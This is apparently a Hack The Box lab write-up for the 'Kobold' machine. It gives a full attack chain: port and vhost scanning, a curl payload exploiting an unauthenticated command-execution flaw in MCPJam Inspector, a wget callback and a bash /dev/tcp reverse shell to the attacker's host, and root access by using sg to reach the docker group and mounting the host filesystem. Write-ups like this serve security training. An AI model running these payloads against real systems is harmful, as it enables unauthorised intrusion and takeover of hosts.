---
title: "HTB - Kobold"
date: 2026-04-05
tags: ["HackTheBox","Linux","Easy","CVE-2026-23744","MCPJam","Docker","gshadow","RCE"]
categories: ["Machines&Challenges"]
difficulty: "Easy"
os: "Linux"
author: "z3r0s"
featuredImage: "/logos/Kobold.png"
---
| Field | Value |
|-------|-------|
| Difficulty | Easy |
| OS | Linux (Ubuntu) |
| CVE | CVE-2026-23744 |
| Tags | `docker` `gshadow` `lfi` `mcp` `mcpjam` `pastebin` `path-traversal` `rce` |

---

## Summary

Kobold is a Linux easy box featuring a multi-service web application behind nginx with HTTPS and wildcard virtual hosting. Initial access requires exploiting **CVE-2026-23744** - an unauthenticated RCE in MCPJam Inspector - by sending a crafted JSON payload to `/api/mcp/connect` to execute arbitrary commands. Privilege escalation abuses a discrepancy between `/etc/gshadow` and the running session, allowing the `sg` command to switch into the `docker` group and mount the host filesystem inside a container.

---

## Attack Chain

```
Rustscan → ports 22/80/443/3552
    ↓ vhost fuzzing
mcp.kobold.htb (MCPJam v1.4.2)
    ↓ CVE-2026-23744 unauth RCE
ben (user flag)
    ↓ /etc/gshadow lists ben in docker group
sg docker → docker run -v /:/mnt
    ↓ host FS mounted
root flag
```

---

## 01 - Recon

```bash
rustscan -a $targetIp --ulimit 1000 -r 1-65535 -- -A -sC -Pn
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu
80/tcp   open  http    nginx 1.24.0  (→ https://kobold.htb/)
443/tcp  open  ssl     nginx 1.24.0
3552/tcp open  http    Golang net/http server
```

**Port 3552** hosts **Arcane v1.13.0** - a self-hosted Docker management web UI.

### Subdomain Discovery

```bash
gobuster vhost -u https://kobold.htb --ad \
  -w SecLists/Discovery/DNS/subdomains-top1million-20000.txt \
  -t 50 -k --timeout 20s
```

```
bin.kobold.htb  → PrivateBin
mcp.kobold.htb  → MCPJam
```

---

## 02 - Initial Access: CVE-2026-23744

**MCPJam Inspector <= 1.4.2** listens on `0.0.0.0` by default and exposes `/api/mcp/connect`, which accepts a user-supplied `serverConfig.command` and `args`, then launches that process **without authentication**.

### Test code execution

```bash
cmd="wget http://$attackerIp/ping"
curl -sk https://mcp.kobold.htb/api/mcp/connect \
  --header 'Content-Type: application/json' \
  --data '{"serverConfig":{"command":"bash","args":["-c","'"$cmd"'"],"env":{}},"serverId":"audit"}'
```

### Reverse shell

```bash
cmd="bash -i >& /dev/tcp/$attackerIp/443 0>&1"
curl -sk https://mcp.kobold.htb/api/mcp/connect \
  --header 'Content-Type: application/json' \
  --data '{"serverConfig":{"command":"bash","args":["-c","'"$cmd"'"],"env":{}},"serverId":"audit"}'
```

```bash
sudo rlwrap nc -lnvp 443
# Connection from 10.129.78.103:49756

ben@kobold:~$ id
uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)
ben@kobold:~$ cat ~/user.txt
```

---

## 03 - Privilege Escalation: gshadow Docker Escape

### Initial Docker attempt (fails)

```bash
docker run -it --rm -v /:/mnt --user root --entrypoint /bin/sh \
  privatebin/nginx-fpm-alpine:2.0.2
# permission denied while trying to connect to the Docker daemon socket
```

### Root Cause Analysis

The Docker socket is restricted to the `docker` group. Checking `/etc/gshadow` vs actual session:

```bash
groups alice
# alice : alice operator docker

# The groups command didn't show docker for ben - but:
cat /etc/gshadow | grep ben
# operator:*::ben,alice
# docker:!::ben,alice   ← ben IS in docker group in gshadow!
```

**Discrepancy:** `/etc/gshadow` lists `ben` in the `docker` group, but the running session's group list doesn't reflect it due to NSS inconsistency.

### Exploiting the Misconfiguration

The `sg` command validates directly against `/etc/group` and `/etc/gshadow`, bypassing the session cache:

```bash
sg docker -c '
  docker run -it --rm \
    -v /:/mnt \
    --user root \
    --entrypoint /bin/sh \
    privatebin/nginx-fpm-alpine:2.0.2
'
```

```
/var/www # cat /mnt/root/root.txt
```

---

## Attack Roadmap

| Step | Action | Result |
|------|--------|--------|
| 1 | Rustscan/Nmap | Ports 22, 80, 443, 3552 |
| 2 | VHOST fuzzing | `mcp.kobold.htb`, `bin.kobold.htb` |
| 3 | MCPJam v1.4.2 | CVE-2026-23744 identified |
| 4 | Exploit `/api/mcp/connect` | Shell as `ben` |
| 5 | Enumerate groups | `ben` in `docker` via `/etc/gshadow` |
| 6 | `sg docker` + `docker run -v /:/mnt` | Host FS mounted |
| 7 | Read `/mnt/root/root.txt` | Root flag |

---

## Tools Used

| Tool | Purpose |
|------|---------|
| rustscan / nmap | Port scanning |
| gobuster vhost | Subdomain enumeration |
| curl | CVE-2026-23744 exploit payload |
| rlwrap + nc | Reverse shell listener |
| LinPEAS | Post-exploitation enumeration |
| docker + sg | Privilege escalation via gshadow misconfiguration |
